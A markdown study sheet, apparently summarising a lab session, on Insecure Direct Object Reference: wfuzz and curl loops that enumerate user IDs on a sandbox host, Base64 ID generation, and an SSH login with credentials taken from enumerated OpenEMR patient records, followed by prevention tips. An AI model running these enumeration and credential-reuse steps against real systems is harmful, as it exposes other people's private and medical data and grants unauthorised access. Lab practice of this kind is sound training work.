
# Insecure Direct Object Reference (IDOR)

## What is IDOR?
**Insecure Direct Object Reference (IDOR)** is a type of access control vulnerability that occurs when an application exposes a reference to an internal object (such as a file, database record, or key) without sufficient authorization checks.

**Example scenario:**
```
http://example.com/user/profile?uid=123
```
If an attacker changes `uid=123` to `uid=124`, they may access another user's profile.

---

## How is IDOR discovered?
IDOR is typically found by **manipulating parameters** such as:
- `uid` (user IDs)
- `id` (resource IDs)
- filenames or paths
- numerical or Base64 encoded identifiers

**Enumeration can be automated** with tools like `wfuzz` or manual testing via Burp Suite.

---

## Commands and Examples from This Conversation

### wfuzz Command Example
```
wfuzz -c -z file,/usr/share/SecLists/Fuzzing/6-digits-000000-999999.txt -H "Cookie: PHPSESSID=df1ff45401a6cc7e027d55d7a66587bb" http://idor-sandbox:80/user/?uid=FUZZ
```
- `-c`: color output
- `-z file,...`: wordlist
- `-H`: custom header (session cookie)
- `FUZZ`: injection point

**Response columns:**
- **ID:** Request number
- **Response:** HTTP status code (200, 302, 404, etc.)
- **Lines/Words/Chars:** Helps detect anomalies
- **Payload:** Tested value

Example output interpretation:
```
ID           Response   Lines   Word   Chars   Payload
000000003:   200        15 L    60 W   789 Ch  "23101"
```
Indicates this payload returned different content and should be investigated.

---

## SSH Credential Exfiltration Example
**Scenario:**
- Enumerated patient records in OpenEMR to find credentials.
- Retrieved:
  - **Username:** siren
  - **Password:** healthmatters!
- Connected to SSH on port 2222:

```
ssh -p 2222 siren@192.168.168.105
```
**Important:** Always confirm the username (`siren`) and not the container label (`openemr_adminbox-instance_1`).

---

## Base64 Enumeration Example
Generate Base64 IDs 1-150:
```bash
for i in $(seq 1 150); do
  echo -n "$i" | base64
done
```

Example use in wfuzz:
```
wfuzz -c -z file,base64_ids.txt -H "Cookie: PHPSESSID=YOURSESSION" "http://idor-sandbox/challenge/?uid=FUZZ"
```

---

## Manual Enumeration Example Script
```bash
for i in {1..50}; do
  echo "Checking uid=$i"
  curl -s "http://idor-sandbox:80/user/?uid=$i" | grep -i "flag"
done
```
This loops over IDs and searches the response for "flag".

---

## Common Response Codes
- **200:** Success (data found)
- **302:** Redirect (may be a sign of protected or missing data)
- **404:** Not found
- **403:** Forbidden

---

## Best Practices to Prevent IDOR
- Always perform **authorization checks** on the server side.
- Use **indirect references** (e.g., UUIDs or hashes).
- Enforce **access control policies** consistently.
- Avoid relying solely on hidden or obfuscated identifiers.

---

## References
- OWASP Top 10: Broken Access Control
- OWASP Cheat Sheet Series: IDOR Prevention

---

## Notes from This Conversation
- You enumerated ranges (1–150 Base64, 15990–32000 numbers).
- You used wfuzz with `--hh` and `--hc` to filter responses.
- You handled SSH host authenticity prompts.
- You clarified the difference between usernames and container labels.
- You retrieved credentials (`siren`/`healthmatters!`) and connected via SSH.

---

**End of Notes**
